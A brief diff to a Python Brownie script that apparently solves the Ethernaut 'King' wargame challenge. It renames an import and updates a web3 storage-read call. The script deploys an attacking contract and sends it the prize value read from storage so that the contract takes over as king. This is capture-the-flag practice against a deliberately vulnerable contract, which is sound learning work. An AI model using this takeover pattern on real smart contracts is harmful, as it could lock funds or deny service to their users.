@@ -1,4 +1,4 @@
-from scripts.helper.context import *
+from scripts.helper.utils import *
 from scripts.helper.account import _from, acc
 from scripts.helper.web3 import web3
 from brownie import King, KingAttack
@@ -18,7 +18,7 @@ def solve_challenge():
     kingattack = KingAttack.deploy(EthernautInstances['king'], _from)
     
     # call becomeKing() in the attacking contract to make the contract address the king
-    kingattack.becomeKing({'value':int(web3.eth.getStorageAt(king.address, '0x01').hex(),16)} | _from)
+    kingattack.becomeKing({'value':int(web3.eth.get_storage_at(king.address, '0x01').hex(),16)} | _from)
 
     # check if the contract address is king
     king_assertion = king._king() == kingattack.address
